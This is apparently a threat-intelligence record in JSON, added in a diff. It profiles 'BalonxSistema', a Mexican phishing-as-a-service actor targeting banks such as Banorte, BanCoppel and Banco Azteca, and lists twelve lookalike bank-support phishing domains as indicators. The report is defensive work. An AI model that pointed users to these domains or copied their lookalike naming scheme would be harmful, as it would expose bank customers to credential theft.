+   "hash": "eb5fbba00554238fd26d67d40ff328240a35ead8c2909c85337f4161f52c586e",
+   "mime": "image/png",
+   "name": "eb5fbba00554238fd26d67d40ff328240a35ead8c2909c85337f4161f52c586e",
+   "size": 67176
+  },
+  {
+   "hash": "e4f993effd56034fc2e1a5bdcdfe1d6df3026d56dd8b6bfee7930eba5feaa1a0",
+   "mime": "image/png",
+   "name": "e4f993effd56034fc2e1a5bdcdfe1d6df3026d56dd8b6bfee7930eba5feaa1a0",
+   "size": 649325
+  },
+  {
+   "hash": "37385efb16712620fefba291dc8aa6a670500d2c4261c4db4abd5fcb53da4b11",
+   "mime": "image/png",
+   "name": "37385efb16712620fefba291dc8aa6a670500d2c4261c4db4abd5fcb53da4b11",
+   "size": 524023
+  }
+ ],
+ "forumsAccounts": [],
+ "fraudMatrix": [],
+ "hasIocs": true,
+ "id": "9451b1f419f89743a3d93decd7fe333918fe7b57",
+ "indicatorMalwareRelationships": [],
+ "indicatorRelationships": [],
+ "indicatorToolRelationships": [],
+ "indicators": [
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-08-10",
+   "dateLastSeen": "2026-08-10",
+   "domain": "soporte-aclaraciones-mx.online",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "ae1abfd952d099fedde79cbd3af8d609a4c2c745",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "soporte-aclaraciones-mx.online",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835909995,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-08-10",
+   "dateLastSeen": "2026-08-10",
+   "domain": "blindaje-aclaracion-mex.online",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "6b32f1a12d5233b525aa71807bfa203e76e221b0",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "blindaje-aclaracion-mex.online",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910004,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-08-10",
+   "dateLastSeen": "2026-08-10",
+   "domain": "aclaracion-soporte-mex.online",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "66aefab04824a1b6bec1794fd925550471f89413",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "aclaracion-soporte-mex.online",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910009,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-08-10",
+   "dateLastSeen": "2026-08-10",
+   "domain": "aclaracion-blindaje-mx.online",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "9f6a36551fc9b14bcd8ded86a5e2b78767309064",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "aclaracion-blindaje-mx.online",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910015,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-08-12",
+   "dateLastSeen": "2026-08-12",
+   "domain": "blindajes-aclaraciones-web.online",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "cb933f602c8e70c959040adc27fe87a733d2e9be",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "blindajes-aclaraciones-web.online",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910020,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-06-30",
+   "dateLastSeen": "2026-06-30",
+   "domain": "aclaraciones-soporte-mx.online",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "e63699046545385ad1269b320e90e8b9305a7117",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaraciones-soporte-mx.online/",
+    "domain": "aclaraciones-soporte-mx.online",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910027,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaraciones-soporte-mx.online/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-06-27",
+   "dateLastSeen": "2026-06-28",
+   "domain": "aclaracion-soporte-mx.online",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "63df8467ba18a9a155f3df88372bb8a83481bfcf",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaracion-soporte-mx.online",
+    "domain": "aclaracion-soporte-mx.online",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910033,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaracion-soporte-mx.online"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-06-25",
+   "dateLastSeen": "2026-06-26",
+   "domain": "aclaraciones.site",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "ba5c218683503ca5a27a13746037c4603714652a",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaraciones.site",
+    "domain": "aclaraciones.site",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910040,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaraciones.site"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-06-18",
+   "dateLastSeen": "2026-06-19",
+   "domain": "aclaraciones-digital.xyz",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "2b58bbdd175babeb978431adf7c9dc15efac2bcf",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaraciones-digital.xyz/",
+    "domain": "aclaraciones-digital.xyz",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910047,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaraciones-digital.xyz/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-06-17",
+   "dateLastSeen": "2026-06-18",
+   "domain": "balonx.online",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "3dac62f2b701f021adf5efbe55832911d6c7d48a",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://balonx.online",
+    "domain": "balonx.online",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910055,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://balonx.online"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-06-26",
+   "dateLastSeen": "2026-06-27",
+   "domain": "soporte-aclaracion.online",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "03d4eff6f1751fd1127a32943499557dbeb3cc91",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://soporte-aclaracion.online",
+    "domain": "soporte-aclaracion.online",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910067,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://soporte-aclaracion.online"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-06-17",
+   "dateLastSeen": "2026-06-18",
+   "domain": "soporte-aclaracion.xyz",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "ffc0f052e0a15017fcb5fbb1a8a1d055861af044",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://soporte-aclaracion.xyz/",
+    "domain": "soporte-aclaracion.xyz",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893835910071,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://soporte-aclaracion.xyz/"
+  }
+ ],
+ "indicatorsIds": [
+  "ae1abfd952d099fedde79cbd3af8d609a4c2c745",
+  "6b32f1a12d5233b525aa71807bfa203e76e221b0",
+  "66aefab04824a1b6bec1794fd925550471f89413",
+  "9f6a36551fc9b14bcd8ded86a5e2b78767309064",
+  "cb933f602c8e70c959040adc27fe87a733d2e9be",
+  "e63699046545385ad1269b320e90e8b9305a7117",
+  "63df8467ba18a9a155f3df88372bb8a83481bfcf",
+  "ba5c218683503ca5a27a13746037c4603714652a",
+  "2b58bbdd175babeb978431adf7c9dc15efac2bcf",
+  "3dac62f2b701f021adf5efbe55832911d6c7d48a",
+  "03d4eff6f1751fd1127a32943499557dbeb3cc91",
+  "ffc0f052e0a15017fcb5fbb1a8a1d055861af044"
+ ],
+ "isAutogen": false,
+ "isPublished": true,
+ "isTailored": false,
+ "labels": [],
+ "langs": [
+  "en"
+ ],
+ "malwareList": [],
+ "mitreMatrix": [],
+ "oldId": null,
+ "regions": [
+  "america:central_america"
+ ],
+ "relatedThreatActors": [],
+ "reportNumber": "CP-3006-2245",
+ "sectors": [
+  "financial-services",
+  "financial-services:financial-services",
+  "financial-services:accounting",
+  "financial-services:angel-investment",
+  "financial-services:asset-management",
+  "financial-services:auto-insurance",
+  "financial-services:banking",
+  "financial-services:bitcoin",
+  "financial-services:commercial-insurance",
+  "financial-services:commercial-lending",
+  "financial-services:consumer-lending",
+  "financial-services:credit",
+  "financial-services:credit-bureau",
+  "financial-services:credit-cards",
+  "financial-services:crowdfunding",
+  "financial-services:cryptocurrency",
+  "financial-services:debit-cards",
+  "financial-services:debt-collections",
+  "financial-services:finance",
+  "financial-services:financial-exchanges",
+  "financial-services:fintech",
+  "financial-services:fraud-detection",
+  "financial-services:funding-platform",
+  "financial-services:gift-card",
+  "financial-services:health-insurance",
+  "financial-services:hedge-funds",
+  "financial-services:impact-investing",
+  "financial-services:incubators",
+  "financial-services:insurance",
+  "financial-services:insurtech",
+  "financial-services:leasing",
+  "financial-services:lending",
+  "financial-services:life-insurance",
+  "financial-services:micro-lending",
+  "financial-services:mobile-payments",
+  "financial-services:payments",
+  "financial-services:personal-finance",
+  "financial-services:prediction-markets",
+  "financial-services:property-insurance",
+  "financial-services:real-estate-investment",
+  "financial-services:stock-exchanges",
+  "financial-services:trading-platform",
+  "financial-services:transaction-processing",
+  "financial-services:venture-capital",
+  "financial-services:virtual-currency",
+  "financial-services:wealth-management"
+ ],
+ "seqPublish": null,
+ "seqUpdate": 17893835911103,
+ "shortDescription": null,
+ "shortTitle": null,
+ "sourceList": [],
+ "sources": [],
+ "targetDomain": [],
+ "targetedCompany": [
+  "PlataCard",
+  "BanCoppel",
+  "Grupo Financiero Banorte SAB de CV",
+  "Falabella",
+  "Banco Azteca",
+  "Liverpool",
+  "Mifel",
+  "American Express",
+  "Scotiabank",
+  "Afirme",
+  "Banregio",
+  "Banjercito"
+ ],
+ "targetedPartnersAndClients": [],
+ "techSeqUpdate": null,
+ "threatActor": {
+  "country": "MX",
+  "id": "2530a2b46223154e3bc70a245138aa3c4eb75446",
+  "isAPT": false,
+  "name": "BalonxSistema"
+ },
+ "title": "Balonx Sistema PhaaS Mexico",
+ "toolList": [],
+ "type": "threat",
+ "unreliableIndicators": [],
+ "unreliableIndicatorsRelations": [],
+ "updatedAt": "2026-09-14T13:59:51+03:00"
+}
